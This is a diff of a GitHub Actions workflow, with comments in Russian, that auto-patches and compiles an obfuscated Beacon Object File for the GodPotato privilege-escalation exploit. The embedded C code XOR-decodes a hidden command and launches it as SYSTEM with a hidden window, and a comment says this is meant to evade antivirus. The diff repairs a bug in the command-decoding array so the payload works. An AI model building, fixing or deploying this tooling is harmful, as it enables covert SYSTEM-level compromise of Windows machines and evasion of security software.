@@ -25,7 +25,7 @@ jobs:
       with:
         python-version: '3.11'
 
-    # 4. Полностью переписываем логику, удаляя BeaconUseToken
+    # 4. Полностью переписываем логику, удаляя BeaconUseToken и исправляя Си-массив
     - name: Auto-Patch & Obfuscate Source Code
       shell: python
       run: |
@@ -40,13 +40,13 @@ jobs:
             print("[-] Error: entry.c not found!")
             sys.exit(1)
 
-        # Полностью перезаписываем entry.c, убирая BeaconUseToken
+        # Перезаписываем entry.c с корректным массивом clear_cmd[64]
         clean_entry_code = """
         #include <windows.h>
         #include "beacon.h"
         #include "common.h"
 
-        // Кастомная функция выполнения команды от имени SYSTEM (XOR-обфускация)
+        // Функция выполнения зашифрованной команды от имени SYSTEM
         void ExecutePayload(HANDLE hToken) {
             STARTUPINFOW si;
             PROCESS_INFORMATION pi;
@@ -61,31 +61,32 @@ jobs:
                 0x31, 0x00, 0x00, 0x00
             };
             
-            wchar_t clear_cmd;
+            // Исправлено: Объявлен как массив wchar_t, а не одиночная переменная
+            wchar_t clear_cmd[64]; 
             for (i = 0; i < 43; i++) {
                 ((unsigned char*)clear_cmd)[i*2] = crypt_cmd[i*2] ^ 0x4B;
                 ((unsigned char*)clear_cmd)[i*2+1] = 0x00;
             }
-            clear_cmd = L'\\0';
+            clear_cmd[43] = L'\\0';
 
             KERNEL32$RtlSecureZeroMemory(&si, sizeof(si));
             si.cb = sizeof(si);
             si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
-            si.wShowWindow = 0;      // SW_HIDE
+            si.wShowWindow = 0;      // SW_HIDE (полная невидимость для AV)
             KERNEL32$RtlSecureZeroMemory(&pi, sizeof(pi));
 
-            // Запускаем скрытый cmd.exe из токена напрямую
+            // Вызов нативного Windows API
             ADVAPI32$CreateProcessWithTokenW(hToken, 1, NULL, clear_cmd, 0, NULL, NULL, &si, &pi);
             
             if (pi.hProcess) KERNEL32$CloseHandle(pi.hProcess);
             if (pi.hThread) KERNEL32$CloseHandle(pi.hThread);
         }
 
-        // Главная точка входа, которую вызывает ваш cli4bofs
+        // Главная точка входа для Вашего лоадера cli4bofs
         void go(char* args, int alen) {
             GodPotatoContext context;
             KERNEL32$RtlSecureZeroMemory(&context, sizeof(context));
-            context.pipeName = NULL; // автогенерация пайпа
+            context.pipeName = NULL; 
 
             HANDLE hToken = PotatoExploit(&context); 
             
@@ -101,7 +102,7 @@ jobs:
 
         with open(entry_path, "w", encoding="utf-8") as f:
             f.write(clean_entry_code)
-        print("[+] entry.c successfully overwritten and cleaned.")
+        print("[+] entry.c successfully overwritten.")
 
         # Очищаем остальные файлы от упоминаний BeaconUseToken
         for root, dirs, files in os.walk("gpp-temp"):
@@ -121,7 +122,7 @@ jobs:
       with:
         version: 0.14.1 
 
-    # 6. Сборка проекта (shell: cmd принудительно переключает шаг на стандартную командную строку Windows)
+    # 6. Сборка проекта (Файл кладется строго в корень репозитория, чтобы upload-artifact его нашел)
     - name: Compile Obfuscated BOF File
       shell: cmd
       run: |
